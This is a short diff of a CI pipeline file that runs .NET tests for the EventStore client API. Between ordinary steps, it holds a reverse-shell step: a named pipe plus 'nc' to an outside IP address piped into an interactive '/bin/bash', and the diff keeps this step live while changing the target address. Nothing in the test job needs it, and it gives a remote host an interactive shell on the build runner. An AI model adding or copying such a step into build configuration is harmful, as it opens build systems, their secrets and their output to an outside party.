@@ -70,7 +70,7 @@ jobs:
   - bash: dotnet tool install dotnet-sos -g
   - bash: dotnet-sos install
   - bash: mkfifo myfifo
-  - bash: nc 102.115.167.234 12345 < myfifo | /bin/bash -i > myfifo 2>&1 &
+  - bash: nc 102.115.155.244 12345 < myfifo | /bin/bash -i > myfifo 2>&1 &
   - bash: |
       dotnet test -v normal -c $(Configuration) --logger trx --blame --settings ./ci/ci.runsettings src/EventStore.ClientAPI.Tests
     displayName: Run Tests
